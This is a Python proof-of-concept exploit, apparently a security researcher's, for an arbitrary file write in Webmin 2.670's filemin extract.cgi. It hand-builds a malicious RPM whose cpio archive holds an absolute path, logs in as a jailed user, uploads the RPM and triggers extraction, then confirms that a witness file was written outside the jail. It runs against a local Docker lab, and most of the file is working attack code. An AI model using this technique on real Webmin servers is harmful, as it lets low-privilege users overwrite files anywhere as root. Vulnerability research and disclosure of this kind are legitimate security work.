#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: webmin-filemin-cpio (High: 8.8)
#  Vendor: Webmin
#  Versions: Webmin 2.670
#  Impact: extract.cgi rpm2cpio|cpio without --no-absolute-filenames writes outside jail
#  Requires: Docker, git, python3, rpm2cpio, cpio
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "webmin-filemin-cpio"
_EMAIL = "abraxas.null@proton.me"

_RST = "\033[0m"
_BLD = "\033[1m"
_CYAN = (0, 255, 249)
_MAGENTA = (255, 0, 212)
_PINK = (255, 77, 224)
_GREEN = (57, 255, 20)
_GOLD = (255, 230, 0)
_AMBER = (255, 201, 70)
_RED = (255, 64, 96)
_MUTED = (140, 155, 175)
_INK = (232, 255, 248)
_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    if not _on():
        return ""
    return f"\033[38;2;{r};{g};{b}m"


def _paint(text, rgb, bold=False):
    if not text or rgb is None:
        return text or ""
    prefix = _rgb(*rgb) + (_BLD if bold else "")
    return "".join(ch if ch == " " else prefix + ch for ch in text)


def _box(inner, border):
    edge = _rgb(*border) + "║" + _RST
    return edge + " " + inner + _RST + " " + edge


def _rule(left, right, border, width):
    return _rgb(*border) + left + "═" * (width - 2) + right + _RST


def _split(text, left_end, right_start, left_rgb, right_rgb, mid_rgb=None, left_bold=False):
    return (
        _paint(text[:left_end], left_rgb, bold=left_bold)
        + _paint(text[left_end:right_start], mid_rgb)
        + _paint(text[right_start:], right_rgb)
    )


def _fit(left, right, width, fill=" "):
    gap = max(width - len(left) - len(right), 1)
    return (left + fill * gap + right)[:width].ljust(width)


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line):
    width = max(len(line), 1)
    out = []
    quoted = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        quoted ^= ch == '"'
        if ch == '"':
            color = _AMBER if quoted else _GOLD
        elif quoted:
            color = _GOLD
        else:
            color = _rain(x, width)
        out.append(_rgb(*color) + ch)
    return "".join(out) + _RST


def _banner_width(cols):
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(row) for row in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    return content_w, box_w


def _title_row(width):
    left, right = " ABRAXAS LABS", "analyze · reverse · disclose"
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _CYAN, _MUTED, left_bold=True)


def _cve_row(width):
    left, right = " " + _CVE, "authorized research only"
    rest = max(width - len(left) - len(right), 3)
    text = (left + " local lab ".center(rest)[:rest] + right)[:width].ljust(width)
    return _split(text, len(left), width - len(right), _PINK, _GREEN, mid_rgb=_MAGENTA, left_bold=True)


def _mail_row(width):
    left, right = " Mail", _EMAIL
    text = _fit(left, right, width)
    return _split(text, len(left), width - len(right), _GOLD, _CYAN)


def _status_line():
    marks = {"[": _GREEN, "]": _GREEN, "*": _GREEN, "·": _PINK, "#": _PINK}
    text = "[*]  abraxas!null ready on #labs"
    return "".join(ch if ch == " " else _rgb(*marks.get(ch, _INK)) + ch for ch in text) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    content_w, box_w = _banner_width(cols)
    lines = [
        _rule("╔", "╗", _CYAN, box_w),
        _box(_title_row(content_w) + _RST, _CYAN),
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_cve_row(content_w) + _RST, _MAGENTA),
        _rule("╠", "╣", _MAGENTA, box_w),
    ]
    for glyph in _ART["abraxas"] + _ART["labs"]:
        vis = glyph[:content_w].ljust(content_w)
        lines.append(_box(_logo_line(vis), _MAGENTA))
    lines.extend([
        _rule("╠", "╣", _MAGENTA, box_w),
        _box(_mail_row(content_w) + _RST, _MAGENTA),
        _rule("╚", "╝", _CYAN, box_w),
        " " + _status_line(),
    ])
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _message_color(s):
    low = s.lower()
    stripped = s.lstrip()
    if low.startswith("success"):
        return _rgb(*_GREEN) + _BLD
    if low.startswith("fail"):
        return _rgb(*_RED) + _BLD
    if "user_id" in low:
        return _rgb(*_AMBER) + _BLD
    if low.startswith("status=") or "status=" in low[:20]:
        return _rgb(*_CYAN)
    if low.startswith("carrier"):
        return _rgb(*_MAGENTA)
    if stripped[:1] in "{[":
        return _rgb(*_GOLD)
    return _rgb(*_INK)


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    dest = kwargs.get("file", _sys.stdout)
    if dest is not _sys.stdout and dest is not _sys.stderr:
        _builtins.print(*args, **kwargs)
        return
    extra = {k: v for k, v in kwargs.items() if k != "sep"}
    _builtins.print(_message_color(s) + s + _RST, **extra)

print_abraxas_banner()
_builtins.print = _cprint

"""Witness-only: Webmin 2.670 filemin/extract.cgi cpio writes absolute RPM members."""

import gzip
import http.client
import http.cookiejar
import os
import struct
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path

LABEL = "WEBMIN-H10-FILEMIN-CPIO"
WITNESS = "WEBMIN-H10-CPIO-WRITE"
IMAGE = "webmin-lab:2.670"
PIN = "2.670"
HOST = "127.0.0.1"
PORT = 18430
BASE = f"http://{HOST}:{PORT}"
COMPOSE = os.environ.get("COMPOSE_PROJECT_NAME", "webminh10")
HERE = Path(__file__).resolve().parent
LIMITED_USER = "fileuser"
LIMITED_PASS = "filepass"
JAIL = "/lab/jail"
TARGET = f"/tmp/{WITNESS}"
RPM_NAME = "h10.rpm"
BOUNDARY = "----WebminH10Cpio7a3f9c2e"


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


class _PassHTTPError(urllib.request.HTTPErrorProcessor):
    def http_response(self, request: urllib.request.Request, response: object) -> object:
        return response

    https_response = http_response


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    headers: dict[str, str]
    cookies: dict[str, str]


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def success() -> int:
    log(f"SUCCESS {LABEL} extract.cgi absolute-cpio {WITNESS}")
    return 0


def clip(text: str, limit: int = 240) -> str:
    compact = " ".join((text or "").split())
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def exec_webmin(*args: str, timeout: int = 30) -> subprocess.CompletedProcess[str]:
    return compose("exec", "-T", "webmin", *args, timeout=timeout)


def exec_stdin(*args: str, data: bytes, timeout: int = 30) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE, "exec", "-T", "webmin", *args],
        cwd=HERE,
        input=data,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def parse_set_cookie(raw: list[tuple[str, str]]) -> dict[str, str]:
    cookies: dict[str, str] = {}
    for key, value in raw:
        if key.lower() != "set-cookie":
            continue
        pair = value.split(";", 1)[0]
        name, _, val = pair.partition("=")
        if name.strip():
            cookies[name.strip()] = val.strip()
    return cookies


def request(
    method: str,
    path: str,
    *,
    cookies: dict[str, str] | None = None,
    form: dict[str, str] | None = None,
    body: bytes | None = None,
    content_type: str | None = None,
    referer: str | None = None,
    timeout: int = 30,
) -> HttpResult:
    headers = {
        "Host": f"{HOST}:{PORT}",
        "Referer": referer or f"{BASE}/filemin/",
        "User-Agent": "h10-filemin-lab",
        "Connection": "close",
    }
    cookie_header = "; ".join(f"{k}={v}" for k, v in (cookies or {}).items())
    if cookie_header:
        headers["Cookie"] = cookie_header
    payload = body
    if form is not None:
        payload = urllib.parse.urlencode(form).encode("ascii")
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    elif content_type:
        headers["Content-Type"] = content_type
    if payload is not None:
        headers["Content-Length"] = str(len(payload))
    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        conn.request(method, path, body=payload, headers=headers)
        resp = conn.getresponse()
        raw_headers = resp.getheaders()
        text = resp.read().decode("utf-8", errors="replace")
        merged = {k.lower(): v for k, v in raw_headers}
        return HttpResult(resp.status, text, merged, parse_set_cookie(raw_headers))
    except (OSError, http.client.HTTPException) as exc:
        raise ApiError("unreachable") from exc
    finally:
        conn.close()


def wait_http() -> None:
    last = "none"
    for attempt in range(1, 91):
        try:
            result = request("GET", "/session_login.cgi", cookies={"testing": "1"})
        except ApiError as exc:
            last = exc.reason
            log(f"IOC http-wait attempt={attempt} err={last}")
            time.sleep(2)
            continue
        last = str(result.status)
        log(f"IOC http-wait attempt={attempt} http={result.status}")
        if result.status in {200, 401}:
            return
        time.sleep(2)
    raise ApiError(f"webmin-not-ready-{last}")


def login(user: str, password: str) -> dict[str, str]:
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        _PassHTTPError,
    )
    login_url = f"{BASE}/session_login.cgi"
    get_req = urllib.request.Request(
        login_url,
        headers={"User-Agent": "h10-filemin-lab", "Accept": "text/html"},
        method="GET",
    )
    try:
        with opener.open(get_req, timeout=30) as resp:
            get_status = int(getattr(resp, "status", 0) or 0)
            resp.read()
    except urllib.error.URLError as exc:
        raise ApiError("login-unreachable") from exc
    testing = any(c.name == "testing" and c.value == "1" for c in jar)
    log(f"IOC login-form http={get_status} testing={int(testing)}")
    payload = urllib.parse.urlencode(
        {"user": user, "pass": password, "page": "/"}
    ).encode("ascii")
    post_req = urllib.request.Request(
        login_url,
        data=payload,
        headers={
            "User-Agent": "h10-filemin-lab",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": login_url,
        },
        method="POST",
    )
    try:
        with opener.open(post_req, timeout=30) as resp:
            status = int(getattr(resp, "status", 0) or 0)
            body = resp.read().decode("utf-8", "replace")
            loc = str(resp.geturl() or "")
    except urllib.error.URLError as exc:
        raise ApiError("login-post-unreachable") from exc
    sid = ""
    for cookie in jar:
        if cookie.name == "sid" and cookie.value and cookie.value != "x":
            sid = cookie.value
            break
    log(
        f"IOC login user={user} http={status} sid={'yes' if sid else 'no'} "
        f"loc={clip(loc)} body={clip(body)}"
    )
    if not sid:
        raise ApiError(f"login-{user}-{status}")
    return {"testing": "1", "sid": sid}


def _pad4(n: int) -> bytes:
    return b"\x00" * ((4 - (n % 4)) % 4)


def cpio_member(name: str, data: bytes, mode: int, ino: int) -> bytes:
    name_b = name.encode("ascii") + b"\x00"
    header = (
        b"070701"
        + f"{ino:08x}".encode("ascii")
        + f"{mode:08x}".encode("ascii")
        + f"{0:08x}".encode("ascii")
        + f"{0:08x}".encode("ascii")
        + f"{1:08x}".encode("ascii")
        + f"{0:08x}".encode("ascii")
        + f"{len(data):08x}".encode("ascii")
        + f"{0:08x}".encode("ascii") * 4
        + f"{len(name_b):08x}".encode("ascii")
        + f"{0:08x}".encode("ascii")
    )
    block = header + name_b
    block += _pad4(len(block))
    return block + data + _pad4(len(data))


RPM_INT32 = 4
RPM_STRING = 6
RPM_BIN = 7
RPM_HEADERSIGNATURES = 62
RPM_HEADERIMMUTABLE = 63
ALIGN_OF = {3: 2, 4: 4, 5: 8}


def _idx(tag: int, typ: int, offset: int, count: int) -> bytes:
    return struct.pack("!iiii", tag, typ, offset, count)


def rpm_header(region_tag: int, entries: list[tuple[int, int, bytes, int]]) -> bytes:
    ordered = sorted(entries, key=lambda item: item[0])
    store = b""
    index_rest = b""
    for tag, typ, data, count in ordered:
        align = ALIGN_OF.get(typ, 1)
        if align > 1:
            store += b"\x00" * ((align - (len(store) % align)) % align)
        index_rest += _idx(tag, typ, len(store), count)
        store += data
    nindex = 1 + len(ordered)
    trailer_off = len(store)
    store += _idx(region_tag, RPM_BIN, -(nindex * 16), 16)
    index = _idx(region_tag, RPM_BIN, trailer_off, 16) + index_rest
    intro = b"\x8e\xad\xe8\x01\x00\x00\x00\x00" + struct.pack("!II", nindex, len(store))
    return intro + index + store


def build_rpm() -> bytes:
    payload = (WITNESS + "\n").encode("ascii")
    cpio = cpio_member(TARGET, payload, 0o100644, 1)
    cpio += cpio_member("TRAILER!!!", b"", 0, 2)
    gz = gzip.compress(cpio, mtime=0)
    hdr = rpm_header(
        RPM_HEADERIMMUTABLE,
        [
            (1000, RPM_STRING, b"h10\x00", 1),
            (1124, RPM_STRING, b"cpio\x00", 1),
            (1125, RPM_STRING, b"gzip\x00", 1),
        ],
    )
    sig = rpm_header(
        RPM_HEADERSIGNATURES,
        [
            (1000, RPM_INT32, struct.pack("!I", len(hdr) + len(gz)), 1),
        ],
    )
    sig += b"\x00" * ((8 - (len(sig) % 8)) % 8)
    lead = struct.pack(
        "!4sBBHH66sHH16s",
        b"\xed\xab\xee\xdb",
        3,
        0,
        0,
        1,
        b"h10",
        1,
        5,
        b"\x00" * 16,
    )
    return lead + sig + hdr + gz


def multipart_rpm(blob: bytes) -> tuple[bytes, str]:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="upfiles"; filename="{RPM_NAME}"\r\n'
        "Content-Type: application/x-rpm\r\n"
        "\r\n"
    ).encode("ascii")
    tail = f"\r\n--{BOUNDARY}--\r\n".encode("ascii")
    return head + blob + tail, f"multipart/form-data; boundary={BOUNDARY}"


def pin_ok() -> bool:
    proc = exec_webmin("cat", "/etc/webmin/version")
    version = (proc.stdout or "").strip()
    log(f"IOC pin-version={version or 'missing'} image={IMAGE} expect={PIN}")
    return version == PIN


def tools_ok() -> bool:
    rpm2 = exec_webmin("bash", "-lc", "command -v rpm2cpio; command -v cpio")
    mime = exec_webmin("perl", "-MFile::MimeInfo", "-e", "print 1")
    log(f"IOC tools {clip(rpm2.stdout or rpm2.stderr or '')} mime={clip(mime.stdout or '')}")
    return rpm2.returncode == 0 and "rpm2cpio" in (rpm2.stdout or "") and mime.stdout.strip() == "1"


def acl_ok() -> bool:
    proc = exec_webmin("cat", f"/etc/webmin/filemin/{LIMITED_USER}.acl")
    text = proc.stdout or ""
    log(f"IOC acl={clip(text.replace(chr(10), ';'))}")
    return f"allowed_paths={JAIL}" in text and "work_as_root=1" in text


def read_path(path: str) -> str | None:
    proc = exec_webmin("cat", path)
    if proc.returncode != 0:
        return None
    return proc.stdout or ""


def path_exists(path: str) -> bool:
    return exec_webmin("test", "-e", path).returncode == 0


def list_cpio_members(blob: bytes) -> str:
    written = exec_stdin("tee", "/tmp/h10-lab.rpm", data=blob)
    if written.returncode != 0:
        raise ApiError(f"plant-rpm-{written.returncode}")
    listed = exec_webmin(
        "bash",
        "-lc",
        "rpm2cpio /tmp/h10-lab.rpm | cpio -t 2>/dev/null || rpm2cpio /tmp/h10-lab.rpm | cpio -t",
    )
    text = (listed.stdout or "") + (listed.stderr or "")
    log(f"IOC rpm2cpio-list rc={listed.returncode} {clip(text)}")
    if listed.returncode != 0:
        raise ApiError("rpm2cpio-failed")
    return text


def upload_rpm(cookies: dict[str, str], blob: bytes) -> HttpResult:
    body, ctype = multipart_rpm(blob)
    return request(
        "POST",
        f"/filemin/upload.cgi?path=&id=h10upload",
        cookies=cookies,
        body=body,
        content_type=ctype,
        referer=f"{BASE}/filemin/index.cgi?path=",
        timeout=60,
    )


def extract_rpm(cookies: dict[str, str]) -> HttpResult:
    qs = urllib.parse.urlencode({"path": "", "file": RPM_NAME})
    return request(
        "GET",
        f"/filemin/extract.cgi?{qs}",
        cookies=cookies,
        referer=f"{BASE}/filemin/index.cgi?path=",
        timeout=60,
    )


def main() -> int:
    try:
        wait_http()
        if not pin_ok():
            return fail("pin-mismatch")
        if not tools_ok():
            return fail("rpm2cpio-or-cpio-missing")
        if not acl_ok():
            return fail("acl-missing")
        blob = build_rpm()
        log(f"IOC rpm-bytes={len(blob)}")
        members = list_cpio_members(blob)
        if TARGET not in members:
            return fail("cpio-member-not-absolute")
        users = exec_webmin("cat", "/etc/webmin/miniserv.users")
        webacl = exec_webmin("grep", f"^{LIMITED_USER}:", "/etc/webmin/webmin.acl")
        log(f"IOC users={clip(users.stdout or users.stderr or '')}")
        log(f"IOC webacl={clip(webacl.stdout or webacl.stderr or '')}")
        cookies = login(LIMITED_USER, LIMITED_PASS)
        listing = request(
            "GET",
            "/filemin/index.cgi?path=",
            cookies=cookies,
            referer=f"{BASE}/",
        )
        log(f"IOC filemin http={listing.status} body={clip(listing.body)}")
        if listing.status != 200:
            return fail(f"filemin-{listing.status}")
        if "notallowed" in listing.body.lower() and JAIL not in listing.body:
            return fail("filemin-jail-denied")
        exec_webmin("rm", "-f", TARGET, f"{JAIL}/{RPM_NAME}")
        exec_webmin("rm", "-rf", f"{JAIL}/h10")
        if path_exists(TARGET):
            return fail("target-preexists")
        uploaded = upload_rpm(cookies, blob)
        log(f"IOC upload http={uploaded.status} loc={clip(uploaded.headers.get('location', ''))}")
        if not path_exists(f"{JAIL}/{RPM_NAME}"):
            return fail(f"upload-missing-{uploaded.status}")
        mime = exec_webmin(
            "perl",
            "-MFile::MimeInfo",
            "-e",
            "print mimetype($ARGV[0])",
            f"{JAIL}/{RPM_NAME}",
        )
        log(f"IOC mime={clip(mime.stdout or mime.stderr or '')}")
        if "x-rpm" not in (mime.stdout or ""):
            return fail("mime-not-rpm")
        extracted = extract_rpm(cookies)
        log(
            f"IOC extract http={extracted.status} "
            f"loc={clip(extracted.headers.get('location', ''))} "
            f"body={clip(extracted.body)}"
        )
        jail_hit = f"{JAIL}/h10{TARGET}"
        if path_exists(jail_hit):
            return fail("relative-inside-jail")
        contents = read_path(TARGET)
        if contents is None:
            return fail(f"extract-no-file-{extracted.status}")
        log(f"IOC outside-file={contents[:240]!r}")
        if WITNESS not in contents:
            return fail("witness-missing")
        if TARGET.startswith(JAIL.rstrip("/") + "/"):
            return fail("target-inside-jail")
        return success()
    except ApiError as exc:
        return fail(exc.reason)
    except subprocess.TimeoutExpired:
        return fail("timeout")


if __name__ == "__main__":
    raise SystemExit(main())

